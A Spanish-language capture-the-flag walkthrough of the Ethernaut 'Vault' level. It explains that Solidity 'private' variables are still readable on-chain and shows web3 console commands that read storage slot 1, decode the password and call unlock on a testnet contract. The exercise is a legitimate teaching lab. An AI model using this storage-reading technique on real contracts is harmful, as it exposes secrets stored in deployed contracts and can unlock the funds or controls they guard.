# Vault

> Estas son las instrucciones en las que se basan este vídeo:

<p align="center">
  <a href="https://www.youtube.com/watch?v=QeXQhAU5TnM">
    <img src="https://img.youtube.com/vi/QeXQhAU5TnM/hqdefault.jpg" alt="Link al video de Youtube">
  </a>
</p>

En este nivel lo único que tenemos que hacer es desbloquear la caja fuerte.

Vamos a [crear](https://sepolia.etherscan.io/tx/0x0088cc8efb0eb2c5c8525b5e8fc87753486b9224c23d02c0fc11252461eec4bf) una nueva instancia del contrato confirmando la transacción en nuestra billetera de `MetaMask`. Mientras se despliega, vamos a analizar el contrato.

## Análisis

En este contrato, podemos ver que primero tenemos una variable booleana que indica si está bloqueado o no y otra variable **PRIVADA** que es la contraseña.

En el `constructor`, se establece la contraseña y el estado cambia a bloqueada.

Después, solo tenemos una función que nos permitirá desbloquear la bóveda si introducimos la contraseña correcta.

Simplemente, tenemos que averiguar la contraseña para completar este nivel.

## Solución

Si investigamos un poco acerca de la [visibilidad](https://docs.soliditylang.org/en/latest/cheatsheet.html#function-visibility-specifiers) de las variables y funciones en Solidity, podemos ver todos los tipos y en específico private indica que solo es visible en el contrato actual, no dice nada acerca de si se puede leer o no los datos.

Pero sabemos que todos los datos almacenados en un `Smart Contract` pueden ser leídos ya que están almacenados en la `Blockchain`.

Además, hay varias [formas](https://solidity-by-example.org/hacks/accessing-private-data/) de acceder a los datos privados de un contrato inteligente usando librerías externas como [web3](https://docs.web3js.org/).

Por último, tenemos que entender como funciona el [almacenamiento](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#layout-of-state-variables-in-storage) de las variables en `Solidity`:

- Hay 2 elevado a la 256 _slots_ de memoria
- Cada slot tiene 32 _bytes_ de almacenamiento
- Los datos se guardan en el orden de declaración del contrato empezando desde el indice cero

Es decir, en el slot 0 está la variable `locked` y en el slot 1 la variable `password`.

## Ataque

Antes de comenzar, vamos a comprobar que la caja fuerte está bloqueada:

```jsx
> await contract.locked()
true
```

Ahora que hemos entendido todo, vamos a utilizar la siguiente función de la librería [web3](https://web3js.org/) para ver el contenido de la variable que se encuentra en el `slot` 1 de la instancia del contrato:

```jsx
> await web3.eth.getStorageAt(instance, 1)
'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
```

Nos devolverá la contraseña codificada en hexadecimal, si queremos verla en texto plano podemos utilizar esta otra función de `web3`:

```jsx
> await web3.utils.hexToAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29");
'A very strong secret password :)'
```

Por último, ahora que sabemos la contraseña para desbloquear la bóveda, vamos a llamar a la función [unlock](https://sepolia.etherscan.io/tx/0x4067e61519d38934bec6b47468784b9552196a9d22c64b24e9c372616a08a116) pasando como parámetro la contraseña en hexadecimal.

```jsx
> await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```

Aceptamos la transacción desde la billetera de `MetaMask` y esperamos a que se confirme en la `blockchain`.

Cuándo se haya confirmado, podemos comprobar si la caja fuerte sigue bloqueada:

```jsx
> await contract.locked()
false
```

Como ya no está bloqueada, vamos a [entregar](https://sepolia.etherscan.io/tx/0x4fb800c8aeb8c4d25ca349a241d480881ec9b08fe52d8eceeef6391de91e99c7) este nivel!

_Ethernaut_, nos recuerda que marcando una variable como `private` **solo previene que otros contratos accedan a ella, todas las variables sean lo que sean son accesibles públicamente**.
